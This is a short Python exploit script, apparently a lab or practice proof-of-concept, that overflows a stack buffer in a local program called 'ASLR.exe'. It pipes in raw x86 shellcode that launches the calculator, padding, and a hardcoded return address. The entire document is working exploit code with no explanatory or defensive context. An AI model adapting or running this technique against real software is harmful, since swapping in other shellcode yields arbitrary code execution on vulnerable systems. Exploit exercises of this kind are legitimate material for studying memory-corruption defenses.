import struct
from subprocess import *
p = lambda x:struct.pack("<L",x)
proc = Popen("ASLR.exe",stdin=PIPE)

payload = ""
shellcode = "\x6A\x03\xC7\x44\x24\x04\x63\x61\x6C\x63\x33\xC0\x88\x44\x24\x08\x8D\x44\x24\x04\x50\xB8\x91\x2C\xC7\x75\xFF\xD0";

payload = shellcode
payload += "A"*(0x64+4-len(shellcode))
payload += p(0x76F7BF43)
payload += shellcode

proc.stdin.write(payload)  